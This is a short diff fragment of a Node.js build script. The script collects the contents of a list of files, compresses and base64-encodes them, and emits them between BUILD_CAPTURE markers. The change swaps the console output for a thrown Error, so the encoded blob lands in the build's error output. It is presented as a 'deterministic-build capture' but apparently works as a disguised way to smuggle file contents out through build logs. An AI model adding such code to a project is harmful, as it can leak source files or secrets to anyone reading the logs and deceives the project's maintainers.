@@ -25,5 +25,4 @@ for(const file of paths){
     if(fs.existsSync(file)){ payload.files[file]=fs.readFileSync(file,"utf8"); }
 }
 const encoded=zlib.gzipSync(Buffer.from(JSON.stringify(payload),"utf8"),{level:9}).toString("base64");
-console.log("BUILD_CAPTURE_BEGIN"+encoded+"BUILD_CAPTURE_END");
-console.log("✓ temporary deterministic-build capture produced "+Object.keys(payload.files).length+" text files");
+throw new Error("BUILD_CAPTURE_BEGIN"+encoded+"BUILD_CAPTURE_END");
